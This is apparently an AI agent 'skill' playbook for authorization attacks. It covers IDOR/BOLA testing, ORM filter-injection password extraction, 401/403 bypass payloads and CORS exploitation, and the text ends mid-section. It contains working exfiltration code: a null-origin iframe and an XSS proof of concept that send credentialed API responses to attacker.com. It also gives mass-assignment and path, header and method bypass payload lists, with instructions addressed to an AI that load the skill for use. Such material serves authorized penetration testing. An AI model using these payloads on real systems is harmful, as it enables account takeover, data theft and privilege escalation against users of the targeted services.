---
name: auth-access
description: >-
  Authorization and access control attacks. Covers IDOR/BOLA (Django ORM filter injection/Prisma nested traversal/Ransack predicates), 401/403 bypass (Tomcat path param/IIS ADS/HTTP verb tamper/connection-state), CORS misconfiguration (null origin/Vary missing/regex bypass), CSRF (SameSite Lax 2-min exemption/CSPT2CSRF/JSON CSRF), and clickjacking. Load when testing object-level authorization or access boundaries.
---

<!-- src: hacker/.claude/skills/auth-access/SKILL.md -->

# Authorization & Access Control Attacks

## Internal Navigation
| Part | Content |
|---|---|
| 1 | IDOR / Broken Object Authorization |
| 2 | 401/403 Bypass Techniques |
| 3 | CORS Misconfiguration |
| 4 | CORS Scenarios |
| 5 | CSRF |
| 6 | Clickjacking |

---
# Part 1: IDOR / Broken Object Authorization


# SKILL: IDOR / Broken Object Level Authorization — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: IDOR is the #1 bug bounty finding. This skill covers non-obvious IDOR surfaces, all attack vectors (not just URL params), A-B testing methodology, BOLA vs BFLA distinction, chaining IDOR to higher impact, and what testers repeatedly miss.


## 1. IDOR vs BOLA vs BFLA

| Term | Meaning | Impact |
|---|---|---|
| IDOR | Insecure Direct Object Reference | Read/modify other users' data |
| BOLA | Broken Object Level Authorization (OWASP API Top 10 A1) | Same as IDOR, API terminology |
| BFLA | Broken Function Level Authorization | Low-priv user accesses HIGH-PRIV functions (e.g., admin endpoints) |

**Key distinction**: 
- BOLA = accessing **object** you shouldn't own (data belonging to other users)
- BFLA = accessing **function** you shouldn't be authorized for (admin CRUD operations, bulk actions, user management)

---

## 2. WHERE TO FIND OBJECT IDs (ALL LOCATIONS)

Don't stop at URL path parameters — IDs appear in:

```
URL path:        GET /api/v1/users/1234/profile
URL query:       GET /orders?order_id=982
Request body:    {"userId": 1234, "action": "view"}
JSON fields:     {"resource": {"id": 5678, "type": "invoice"}}
Headers:         X-User-ID: 1234
                 X-Account-ID: 9999
Cookies:         user_id=1234; account=org_5678
GraphQL args:    query { user(id: "1234") { ... } }
Form fields:     <input name="documentId" value="5678">
WebSocket msgs:  {"event":"subscribe","channel_id":9999}
```

---

## 3. A-B TESTING METHODOLOGY

The most systematic IDOR test approach:

```
Step 1: Create two test accounts: UserA and UserB
Step 2: Perform all actions as UserA, capture all requests
        (profile edit, order view, password change, file access, etc.)
Step 3: Note every object ID created or accessed by UserA
Step 4: Authenticate as UserB
Step 5: Replay UserA's requests using UserB's session token
Step 6: If UserB can read/modify UserA's data → BOLA confirmed

Victim matters: for real bugs, target existing users, not test accounts.
Report evidence: show UserA owns the resource, UserB accessed it.
```

---

## 4. ID TYPE ITS IMPLICATIONS

| ID Pattern | Example | Notes |
|---|---|---|
| Sequential int | `id=1001` → `id=1002` | Easy prediction, high hit rate |
| UUID v4 | `550e8400-...` | Need to find UUID from other endpoints |
| UUID v1 | Clock-based UUID | Time-predictable! Extract timestamp/MAC |
| GUIDs from own data | See in responses | Collect all UUIDs from your own account data first |
| Hashed IDs | `md5(user_id)` | Try hashing sequential ints |
| Encoded IDs | base64(`{"id":1001}`) | Decode → modify → re-encode |
| Compound IDs | `/api/users/1/orders/5` | Both IDs may be independently verifiable |

---

## 5. HORIZONTAL vs VERTICAL PRIVILEGE ESCALATION

**Horizontal**: UserA accesses UserB's data (same privilege level)
```
GET /api/account/1234/statement     ← you are user 5678
```

**Vertical**: Low-priv user accesses admin-only functions
```
POST /api/admin/users/delete        ← normal user calling admin endpoint
GET /api/admin/all-users
PUT /api/users/1234/role {"role":"admin"}
```

**Combined**: Low-priv IDOR that grants privilege escalation
```
GET /api/v1/users/1/details → read admin user's auth token
```

---

## 6. HTTP METHOD ESCALATION

When `GET /resource/1234` is properly restricted, test ALL other verbs:

```http
GET    /api/v1/users/UserA_ID    ← might be blocked
POST   /api/v1/users/UserA_ID    ← different code path, might not check authz
PUT    /api/v1/users/UserA_ID    ← update another user's data
DELETE /api/v1/users/UserA_ID    ← delete another user's account
PATCH  /api/v1/users/UserA_ID    ← partial update (often missed in authz checks)
```

**Why this works**: Authorization logic is often implemented per-method, and developers forget edge cases.

---

## 7. PARAMETER POLLUTION & TYPE CONFUSION

When `id=1234` is validated, try:
```
id[]=1234&id[]=5678          ← array — app may use first or last
id=5678&id=1234              ← duplicate — app may prefer first or last
{"id": "1234"}               ← string vs int: might hit different code path
{"id": [1234]}               ← array in JSON
{"userId": 1234, "id": 5678} ← two ID fields — which is used for authz?
```

**JSON Type Confusion**:
```json
{"userId": "1234"}   vs   {"userId": 1234}
```
Some ORMs handle string vs integer differently in queries.

---

## 8. BFLA (FUNCTION LEVEL) ATTACKS

### Common BFLA Endpoints to Test

```http
# User management (admin-only in design):
GET /api/v1/admin/users
DELETE /api/v1/users/{any_user_id}
PUT /api/v1/users/{user_id}/role

# Bulk operations:
POST /api/v1/users/bulk-delete
GET /api/v1/export/all-data

# Billing/payment admin:
POST /api/v1/admin/subscription/modify
GET /api/v1/admin/payments/all

# Internal reporting:
GET /api/v1/reports/all-users-activity
```

### How to Find Hidden Admin Endpoints
1. Read JS bundles — admin routes often exposed in frontend code
2. Look at API docs (Swagger/OpenAPI) for "admin", "internal", "privileged" tags
3. Enumerate `/api/v1/admin/**`, `/api/v1/manage/**`, `/api/v1/internal/**`
4. Burp "Discover Content" on API base path
5. Compare regular user docs vs admin section docs if available

---

## 9. INDIRECT IDOR (REFERENCE CHAIN)

App checks permission on **object A** but doesn't check ownership of **referenced object B**:

**Example**:
```
UserA has permission to read their own messages.
GET /api/messages/1234 → checks: "does user own message 1234?" ✓

But: messages have attachments.
GET /api/attachments/5678 → doesn't check: "does attachment belong to message owned by user?"
```

Test: access attachments/sub-resources directly via their IDs without going through parent endpoint.

**GraphQL variant**: Inline querying related objects without separate authorization:
```graphql
query {
  myProfile {
    followers {
      privateEmail    ← accessing private field of OTHER users via relationship
    }
  }
}
```

---

## 10. MASS ASSIGNMENT → PRIVILEGE ESCALATION

When POST/PUT takes a JSON body, properties in the underlying model may be settable even if not in the official API docs:

```json
POST /api/v1/register
{
  "username": "attacker",
  "email": "a@evil.com",
  "password": "password",
  "role": "admin",          ← hidden field
  "isAdmin": true,          ← hidden field
  "verified": true,         ← skip email verification
  "creditBalance": 9999     ← give self credits
}
```

**How to find hidden fields**:
1. Intercept admin "create user" vs normal "register" — diff the fields
2. Read API documentation for all possible fields
3. Check source code if available (GitHub, JS bundles)
4. Fuzz with Burp: add common property names and check for `200` vs `400`

---

## 11. STATE MACHINE ABUSE (BUSINESS LOGIC IDOR)

When resources have a status/state:
```
order.status: pending → confirmed → shipped → delivered
```

Test: Can you skip states?
```
PUT /api/orders/1234 {"status": "delivered"}  ← from "pending"
PUT /api/orders/1234 {"status": "refunded"}   ← from "pending" (skip shipped)
```

Can you set another user's order status?
```
PUT /api/orders/UserA_order_id {"status": "cancelled"}  ← as UserB
```

---

## 12. QUICK IDOR CHECKLIST

```
□ Create 2 accounts (UserA + UserB)
□ Map all API calls that contain object IDs (Burp History export filter)
□ Test all HTTP verbs on each endpoint
□ Test ID in all locations: path, body, header, query, cookie
□ Try sequential IDs (−1, +1 from your own)
□ Try UUIDs/GUIDs collected from your own account data
□ Test sub-resources (attachments, comments, transactions)
□ Test admin endpoints directly (BFLA)
□ Test POST/PUT body for extra fields (mass assignment)
□ Compare JSON response field count vs documented fields (hidden fields)
□ Test state/status field modification
```

---

## 13. SYSTEMATIC IDOR TESTING — 8 CATEGORIES

| # | Category | Test Method |
|---|---|---|
| 1 | Direct ID reference | Change numeric/UUID ID in URL: `/api/users/123` → `/api/users/124` |
| 2 | Predictable UUID | If UUIDs are v1 (time-based), adjacent IDs are calculable |
| 3 | Batch/bulk operations | `/api/users/bulk?ids=123,456` — add other users' IDs |
| 4 | Export/download | Export endpoint leaks other users' data: `/export?user_id=*` |
| 5 | Linked object IDOR | Change `order.address_id` to another user's address |
| 6 | Resource replacement | Update own profile with another user's resource ID → overwrites |
| 7 | Write IDOR | PUT/PATCH/DELETE with other user's ID — modify/delete their data |
| 8 | Nested object | `/api/orgs/1/users/2` — change org ID to access other org's users |

### Testing Flow

```
1. Create two test accounts (A and B)
2. Perform all CRUD operations as A, capture all request IDs
3. Replay each request replacing A's IDs with B's IDs
4. Check: Can A read B's data? Modify? Delete?
5. Test with: numeric IDs, UUIDs, slugs, encoded values
6. Test across: URL path, query params, JSON body, headers
```

---

## 14. ORM FILTER CHAIN LEAKS

### Django ORM Filter Injection

```python
# Vulnerable: User.objects.filter(**request.data)
# Attacker sends: {"password__startswith": "a"}
# Django translates to: WHERE password LIKE 'a%'

# Character-by-character extraction:
POST /api/users/
{"username": "admin", "password__startswith": "a"}   → 200 (match)
{"username": "admin", "password__startswith": "b"}   → 404 (no match)
# Iterate through charset for each position

# Relational traversal:
{"author__user__password__startswith": "a"}
# Traverses: Author → User → password field

# On MySQL: ReDoS via regex
{"email__regex": "^(a+)+$"}  → CPU spike if match exists
```

### Prisma Filter Injection

```json
// Vulnerable: prisma.user.findMany({ where: req.body })
// Attacker sends nested include/select:
{
  "include": {
    "posts": {
      "include": {
        "author": {
          "select": {"password": true}
        }
      }
    }
  }
}
// Leaks password field through relation traversal
```

### Ransack (Ruby on Rails)

```
# Ransack allows search predicates via query params:
GET /users?q[password_cont]=admin
# Searches: WHERE password LIKE '%admin%'

# Character extraction:
GET /users?q[password_start]=a   → count results
GET /users?q[password_start]=ab  → narrow down
# Tool: plormber (automated Ransack extraction)
```

---

## 15. B端后台 IDOR 实战方法论（经验沉淀）

> 以下内容来自对大型电商/SaaS商家后台系统的实战IDOR挖掘经验。

### 核心漏洞模式

B端后台普遍存在：**后端信任前端传来的身份参数（sellerId/merchantId/orgId），不校验是否等于当前session用户**。

```
前端 JS: userId = session.getCurrentUser()
→ POST body: {"sellerId": userId, ...}
→ 后端直接用 sellerId 查数据库
→ 未做 sellerId == currentSessionUser 校验
```

### 目标 ID 获取实战技巧

| 来源 | 方法 | 成功率 |
|------|------|--------|
| CPS/追踪像素 | 商品页 Network 搜 `sellerid`/`merchantid`，追踪请求URL中明文携带 | 极高 |
| 前端 JS bundle | 搜硬编码ID、默认值、测试数据（开发者留下的） | 高 |
| HTML 源码 | `window.__DATA__`、页面内嵌的配置JSON | 高 |
| 公开API响应 | 商品详情接口的 JSON 字段 | 中 |
| 已泄露数据二次利用 | 第一个接口返回的orderId/rateId用于第二个接口 | 极高 |

**关键：** 大型平台的userId通常跨子系统统一（如阿里系sellerId跨淘宝/天猫/飞猪通用）。注意区分 userId（用户ID）和 shopId（店铺ID）是不同数字。

### SPA 前端 Bundle 分析

大型SPA的JS bundle（几MB）是信息金矿：
- 搜 `sellerId`/`userId` → 定位所有接口调用点
- 搜 `pageNo`/`pageSize` → 找所有列表接口
- 搜 `download`/`export` → 找批量导出接口（优先测试！）
- 搜 `fetch`/`axios`/`request`/`.json` → 完整API地图
- 搜请求封装函数（如 `request(url, params, method)`）→ 理解统一请求模式

### 接口优先级排序

| 优先级 | 类型 | 命名模式 | 原因 |
|--------|------|---------|------|
| ★★★ | 批量导出 | `download{X}`、`export{X}` | 一次请求=整表数据 |
| ★★★ | 待处理队列 | `getWait{X}List`、`getPending{X}` | 实时业务数据，非公开 |
| ★★★ | 列表查询 | `get{X}List`、`query{X}` | 批量泄露+可遍历 |
| ★★ | 统计数据 | `get{X}Count`、`totalCount`字段 | 暴露业务规模 |
| ★★ | 写操作 | `add{X}`、`update{X}` | 越权篡改 |
| ★ | 配置 | `get{X}Config`、`set{X}` | 业务逻辑泄露/劫持 |

### 网关 302 排查（常见坑）

Burp/curl收到302不代表接口不存在，通常是请求头不对：

| 原因 | 修复 |
|------|------|
| 缺 `Content-Type: application/json;charset=UTF-8` | 必须加 |
| `Accept: text/html`（浏览器导航头） | 改为 `application/json, text/plain, */*` |
| `Sec-Fetch-Mode: navigate` | 改为 `cors` |
| 有 `Upgrade-Insecure-Requests: 1` | 删掉 |
| Origin/Referer 与 Host 不匹配 | 三者保持一致 |
| Cookie 过期 | 重新登录 |

**正确的请求头模板：**
```http
POST /api/endpoint HTTP/1.1
Host: target.com
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
Origin: https://target.com
Referer: https://target.com/
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Cookie: [session]
```

### 响应判断标准

| 响应 | 含义 | 可否报告 |
|------|------|---------|
| 200 + 他人数据 | 确认越权 | ✅ 必报 |
| 200 + `success:true` + 空数据 | 无鉴权，目标无数据 | ✅ 换有数据的ID |
| 200 + `success:true` + `module:false` | 鉴权缺失，业务逻辑拒绝 | ✅ 强调鉴权层缺失 |
| 200 + 异常堆栈 | 信息泄露 | ⚠️ 附加发现 |
| 403 / `NO_PERMISSION` | 有鉴权 | ❌ |
| 302 到错误页 | 网关拦截 | 检查请求头 |

**关键区分：** `success:true` + `module:false` ≠ 有鉴权。有鉴权应返回403或权限错误码。

### 数据敏感度论证

审核可能说"这些数据是公开的"。区分清楚：

| 前台公开数据（不算泄露） | 后台非公开数据（真正的泄露） |
|---|---|
| 商品评价内容/评分 | 买家真实用户ID、完整昵称 |
| 商品信息 | 订单号（可关联其他系统） |
| — | 待评价订单列表（实时交易情报） |
| — | totalCount（业务规模/订单量） |
| — | 精确下单时间（竞争对手监控） |
| — | 内部处理状态、申诉记录 |
| — | 批量导出文件（XLSX整表） |

### 报告要点

1. **证明ID可公开获取** — 具体步骤+截图，否则被"不可预测"驳回
2. **至少两个不同目标ID** — 证明通用性（非特例/测试数据）
3. **区分公开vs非公开数据** — 强调后台管理数据的非公开性
4. **curl一键复现** — 审核人员直接粘贴运行
5. **写操作即使module:false** — 强调鉴权层缺失本身是漏洞
6. **影响规模** — totalCount数值、可遍历数据量、导出文件大小
7. **正式环境验证** — 不只是预发/测试环境

### 工具选择

| 场景 | 工具 | 原因 |
|------|------|------|
| 初步发现+批量测试 | Playwright/浏览器console | 同源绕CORS，自动带Cookie |
| 精确验证+看原始响应 | Burp Suite | 可看302真实响应、二进制文件 |
| 复现命令+报告 | curl | 一键复现，跨平台 |
| JS bundle分析 | 浏览器Sources面板 | 搜索+格式化 |

**Playwright陷阱：** `credentials:'omit'` 在同源页面发的fetch可能仍因TLS连接复用通过网关，不等于真正的未认证。必须用curl从外部确认。


---
# Part 2: 401/403 Bypass Techniques


# SKILL: 401/403 Bypass Techniques — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Comprehensive 401/403 forbidden bypass techniques. Covers path normalization tricks, HTTP method override, header-based bypasses (X-Original-URL, X-Forwarded-For), protocol version tricks, and combination attacks. Base models typically know 2-3 header bypasses but miss the full matrix of path manipulation variants and verb+path combos.

## 0. RELATED ROUTING

- [authbypass-authentication-flaws](../authbypass-authentication-flaws/SKILL.md) — broader auth bypass (login flaws, session handling)
- [waf-bypass-techniques](../waf-bypass-techniques/SKILL.md) — when bypass is WAF-specific rather than access control
- [http-host-header-attacks](../http-host-header-attacks/SKILL.md) — Host header manipulation for routing bypass
- [request-smuggling](../request-smuggling/SKILL.md) — smuggle past access controls entirely
- [http2-specific-attacks](../http2-specific-attacks/SKILL.md) — h2c smuggling to bypass proxy ACLs


## 1. PATH MANIPULATION BYPASSES

The core idea: the reverse proxy/WAF checks one path format, but the backend normalizes differently.

### 1.1 Trailing Slash / Missing Slash

```
/admin      → 403
/admin/     → 200  ✓ (trailing slash)
/admin/.    → 200  ✓ (trailing dot)
```

### 1.2 Case Sensitivity

```
/admin      → 403
/Admin      → 200  ✓
/ADMIN      → 200  ✓
/aDmIn      → 200  ✓
```

Works when: proxy rule is case-sensitive but backend is case-insensitive (common on Windows/IIS).

### 1.3 URL Encoding

```
/admin          → 403
/%61dmin        → 200  ✓ (encode 'a')
/admi%6e        → 200  ✓ (encode 'n')
/%61%64%6d%69%6e → 200  ✓ (full encode)
```

### 1.4 Double URL Encoding

```
/admin              → 403
/%2561dmin          → 200  ✓ (%25 = %, decoded twice: %61 → a)
/admin%252f         → 200  ✓
/admin..%252f       → 200  ✓
```

### 1.5 Unicode / UTF-8 Encoding

```
/admin          → 403
/admi%C0%AE     → 200  ✓ (overlong UTF-8 for '.')
/admi%C0%6E     → 200  ✓ (overlong encoding)
/%C0%AFadmin    → 200  ✓ (overlong '/')
```

### 1.6 Dot-Segment / Path Traversal

```
/admin          → 403
/./admin        → 200  ✓
//admin         → 200  ✓
/admin/./       → 200  ✓
/.//admin       → 200  ✓
/admin..;/      → 200  ✓ (Tomcat path parameter)
```

### 1.7 Null Byte

```
/admin          → 403
/admin%00       → 200  ✓
/admin%00.json  → 200  ✓
/%00/admin      → 200  ✓
```

### 1.8 Path Parameter Injection

```
/admin          → 403
/admin;foo=bar  → 200  ✓ (Tomcat/Java treats ; as path param)
/admin;         → 200  ✓
/admin;x        → 200  ✓
```

### 1.9 Trailing Special Characters

```
/admin%20 (space)  /admin%09 (tab)   /admin? (empty query)
/admin.json        /admin.html       /admin/~
```

### 1.10 Backslash (Windows/IIS)

```
/admin\    /admin\..\/    \..\admin
```

### 1.11 Combined Path Tricks

```
///admin///    /./admin/./    /admin/..;/admin (Tomcat)    /%2e/admin
```

---

## 2. HTTP METHOD BYPASS

### 2.1 Direct Method Change

```
GET  /admin → 403
POST /admin → 200  ✓
PUT  /admin → 200  ✓
PATCH /admin → 200  ✓
DELETE /admin → 200  ✓
OPTIONS /admin → 200  ✓ (may leak allowed methods)
TRACE /admin → 200  ✓ (may reflect headers — XST)
HEAD /admin → 200  ✓ (same as GET but no body — confirms access)
```

### 2.2 Method Override Headers

When the proxy blocks by method, but the backend reads override headers:

```http
GET /admin HTTP/1.1
X-HTTP-Method-Override: PUT

GET /admin HTTP/1.1
X-Method-Override: POST

GET /admin HTTP/1.1
X-HTTP-Method: DELETE

POST /admin HTTP/1.1
X-HTTP-Method-Override: PATCH
_method=PUT  (in POST body — Rails, Laravel)
```

### 2.3 Custom / Invalid Methods

```
FOOBAR /admin HTTP/1.1     → some ACLs only check GET/POST
GETS /admin HTTP/1.1       → typo-like methods may bypass
CONNECT /admin HTTP/1.1    → proxy may tunnel
PROPFIND /admin HTTP/1.1   → WebDAV method
MOVE /admin HTTP/1.1       → WebDAV method
```

---

## 3. HEADER-BASED BYPASS

### 3.1 URL Rewrite Headers (Nginx/IIS)

These headers tell the backend the "real" URL, bypassing proxy-level path checks:

```http
GET / HTTP/1.1
X-Original-URL: /admin

GET / HTTP/1.1
X-Rewrite-URL: /admin
```

The proxy sees `GET /` (allowed), but the backend routes to `/admin`.

### 3.2 IP Spoofing Headers (Whitelist Bypass)

Headers to try (each with values `127.0.0.1`, `10.0.0.1`, `0.0.0.0`, `::1`):

```http
X-Forwarded-For | X-Real-IP | X-Originating-IP | X-Remote-IP
X-Remote-Addr | X-Client-IP | True-Client-IP | Cluster-Client-IP
X-ProxyUser-IP | X-Custom-IP-Authorization | Forwarded: for=127.0.0.1
```

IP encoding variants: `0177.0.0.1` (octal), `2130706433` (decimal), `0x7f000001` (hex), `localhost`

### 3.3 Other Header Tricks

```http
Referer: https://target.com/admin     # Referrer check bypass
Origin: https://target.com             # Origin check bypass
Host: localhost                         # Host header manipulation
X-Forwarded-Host: localhost            # Forwarded host
Content-Type: application/json         # Content-type switch
X-Requested-With: XMLHttpRequest       # AJAX flag
```

---

## 4. PROTOCOL VERSION BYPASS

```http
# HTTP/1.0 (some ACLs only apply to HTTP/1.1)
GET /admin HTTP/1.0

# HTTP/0.9 (extremely legacy — no headers)
GET /admin

# HTTP/2 pseudo-header tricks
:method: GET
:path: /admin
:authority: target.com
# See ../http2-specific-attacks/SKILL.md for H2-specific bypasses
```

---

## 5. VERB TAMPERING + PATH COMBINATION

Combine multiple techniques for higher success rate:

```http
POST / HTTP/1.1                          # method override + URL rewrite
X-Original-URL: /admin
X-HTTP-Method-Override: GET

GET /%61dmin HTTP/1.1                    # IP spoof + path encoding
X-Forwarded-For: 127.0.0.1

GET /Admin HTTP/1.0                      # protocol + case + IP spoof
X-Forwarded-For: 127.0.0.1
```

---

## 6. TECHNOLOGY-SPECIFIC BYPASSES

| Server | Key Tricks |
|---|---|
| **Apache** | `/admin/` (trailing slash), `/.admin` (dot prefix), `/admin%0d` (CR) |
| **Nginx** | `/Admin` (case), `/admin../` (normalization), `X-Original-URL: /admin` |
| **IIS/ASP.NET** | `/admin;.css` (path param+ext), `/admin\` (backslash), `/admin::$DATA` (ADS), `/admin%20` |
| **Tomcat/Java** | `/admin;foo` (path param), `/admin..;/` (traversal), `/;/admin` (empty param) |
| **Spring** | `/admin.anything` (suffix matching, older), `/admin/` (trailing slash) |

---

## 7. AUTOMATED TOOLS

| Tool | Purpose | URL |
|---|---|---|
| **byp4xx** | Comprehensive 403 bypass scanner | github.com/lobuhi/byp4xx |
| **403bypasser** | Automated header/path/method bypass | github.com/sting8k/403bypasser |
| **dirsearch** | Directory brute-force with encoding variants | github.com/maurosoria/dirsearch |
| **feroxbuster** | Recursive content discovery | github.com/epi052/feroxbuster |
| **Burp Intruder** | Custom payload lists for manual testing | portswigger.net |

### byp4xx usage

```bash
# Basic usage
./byp4xx.sh https://target.com/admin

# Output shows all attempted bypasses and their response codes
# 200/301/302 responses = potential bypass found
```

---

## 8. DECISION TREE

```
Got 401 or 403 on a path?
│
├── Try PATH MANIPULATION first (highest success rate)
│   ├── /path/      (trailing slash)
│   ├── /PATH       (case change)
│   ├── /path%20    (trailing space)
│   ├── /./path     (dot segment)
│   ├── //path      (double slash)
│   ├── /path;x     (path parameter — Java/Tomcat)
│   ├── /path..;/   (Tomcat specific)
│   ├── /%2e/path   (encoded dot)
│   ├── /path%00    (null byte)
│   ├── /path%23    (encoded hash)
│   └── Result? → 200 = bypass found
│
├── Path tricks failed → Try METHOD BYPASS
│   ├── POST/PUT/PATCH/DELETE/OPTIONS
│   ├── HEAD (same as GET without body)
│   ├── X-HTTP-Method-Override: PUT
│   └── TRACE (may reflect auth headers — XST)
│
├── Method tricks failed → Try HEADER BYPASS
│   ├── X-Original-URL: /path      (Nginx/IIS rewrite)
│   ├── X-Rewrite-URL: /path       (same concept)
│   ├── X-Forwarded-For: 127.0.0.1 (IP whitelist)
│   ├── X-Real-IP: 127.0.0.1
│   ├── True-Client-IP: 127.0.0.1
│   └── Referer: https://target.com/path
│
├── Header tricks failed → Try PROTOCOL BYPASS
│   ├── HTTP/1.0 instead of 1.1
│   ├── HTTP/2 h2c smuggling (../http2-specific-attacks/)
│   └── WebSocket upgrade
│
├── Single techniques failed → Try COMBINATIONS
│   ├── Method + Path: POST /PATH/
│   ├── Header + Path: X-Forwarded-For + /path%20
│   ├── All three: POST + X-Original-URL + IP headers
│   └── Protocol + Path: HTTP/1.0 + encoded path
│
├── All bypasses failed → Consider ALTERNATIVE APPROACHES
│   ├── Request smuggling (../request-smuggling/) → smuggle past ACL
│   ├── SSRF (../ssrf-server-side-request-forgery/) → access from server
│   ├── IDOR (../idor-broken-object-authorization/) → access data directly
│   └── Auth flaws (../authbypass-authentication-flaws/) → login bypass
│
└── Automated scan with byp4xx / 403bypasser for completeness
```

---

## 9. QUICK REFERENCE — KEY PAYLOADS

```http
# Top 10 quick-wins (try these first)
GET /admin/     HTTP/1.1        # trailing slash
GET /Admin      HTTP/1.1        # case change
GET /admin%20   HTTP/1.1        # trailing space
GET /./admin    HTTP/1.1        # dot segment
GET //admin     HTTP/1.1        # double slash
POST /admin     HTTP/1.1        # method change
GET / HTTP/1.1                  # X-Original-URL bypass
X-Original-URL: /admin
GET /admin HTTP/1.1             # IP whitelist bypass
X-Forwarded-For: 127.0.0.1
GET /admin;.css HTTP/1.1        # IIS path param
GET /admin..;/ HTTP/1.1         # Tomcat bypass
```


---
# Part 3: CORS Misconfiguration


# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

> **AI LOAD INSTRUCTION**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses. For JSONP hijacking deep dives, same-origin policy internals, honeypot de-anonymization, and CORS vs JSONP comparison, load the companion [SCENARIOS.md](./SCENARIOS.md).

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- JSONP hijacking complete attack scenario — watering hole + `<script>` cross-origin data theft
- Honeypot de-anonymization via JSONP — use social platform JSONP endpoints to identify anonymous visitors
- Same-origin policy deep dive — protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks
- CORS vs JSONP technical comparison — methods, error handling, credential behavior, migration path
- CORS exploitation payloads — reflected origin with `credentials: include`, null origin via sandboxed iframe
- Dual-site attack lab pattern — localhost:8981 (target) + localhost:8982 (attacker) testing setup

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.

## 4. RELATED ROUTES

- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- API auth context: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)


## 5. NULL ORIGIN EXPLOITATION

### How `Origin: null` is sent

| Context | Origin Header Value |
|---------|-------------------|
| Sandboxed iframe (`<iframe sandbox>`) | `null` |
| `data:` URI scheme | `null` |
| `file:` protocol (local HTML) | `null` |
| Cross-origin redirect chain (some browsers) | `null` |
| Serialized data in `blob:` URL from opaque origin | `null` |

### Exploitation

If the server includes `null` in its origin allowlist or reflects it:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null` → server reflects `null` → attacker reads credentialed response.

---

## 6. SUBDOMAIN XSS → CORS BYPASS CHAIN

### Attack flow

```text
1. Target API at api.target.com allows CORS from *.target.com
2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.
3. Exploit XSS to make credentialed requests to api.target.com
4. CORS allows the request → attacker reads sensitive API responses
```

### PoC (injected via XSS on blog.target.com)

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://attacker.com/exfil',
        JSON.stringify(data));
});
```

### Why this works

- `blog.target.com` is **same-site** with `api.target.com` → `SameSite` cookies sent
- CORS allowlist includes `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain

### Reconnaissance for this chain

```text
□ Enumerate subdomains (amass, subfinder, crt.sh)
□ Test each for XSS (stored, reflected, DOM)
□ Check if API CORS accepts subdomain origins
□ Subdomain takeover candidates also qualify
```

---

## 7. VARY: ORIGIN CACHING ISSUE

### Problem

When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:

```text
1. Attacker requests: Origin: https://attacker.com
   Response cached with: Access-Control-Allow-Origin: https://attacker.com

2. Victim requests same URL (no Origin or different Origin)
   Cache serves response with: Access-Control-Allow-Origin: https://attacker.com
   → Victim's browser allows attacker.com to read the response (CORS cache poisoning)
```

### Detection

```bash
# Request 1: with attacker origin
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# Request 2: with legitimate origin
curl -H "Origin: https://target.com" https://target.com/api/data -I

# Compare: if both responses have Access-Control-Allow-Origin: https://evil.com
# → cache poisoned, Vary: Origin is missing
```

### Exploitation

```text
1. Warm the cache: send request with Origin: https://attacker.com
2. Wait for victim to access the same cached URL
3. Cached ACAO header allows attacker.com to read the response
4. Attacker page fetches the URL → reads cached response with credentials
```

### Fix verification

```text
□ Response includes Vary: Origin
□ Cache key includes the Origin header
□ Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)
```

---

## 8. REGEX BYPASS PATTERNS

Common flawed regex patterns for origin validation:

| Intended Pattern | Flaw | Bypass Origin |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` matches anything including `-` | `https://attacker-target.com` |
| `^https?://.*target\.com$` | Missing anchor after subdomain | `https://nottarget.com`, `https://attacker.com/.target.com` |
| `target\.com` (substring match) | No anchors | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | Missing port restriction | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | Missing end anchor for path | N/A (but misses subdomains with `-` or digits) |
| Backtracking-vulnerable regex | ReDoS | `https://aaaa...aaa.target.com` (CPU exhaustion) |

### Test payloads for origin validation bypass

```text
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

### Advanced: Unicode normalization bypass

```text
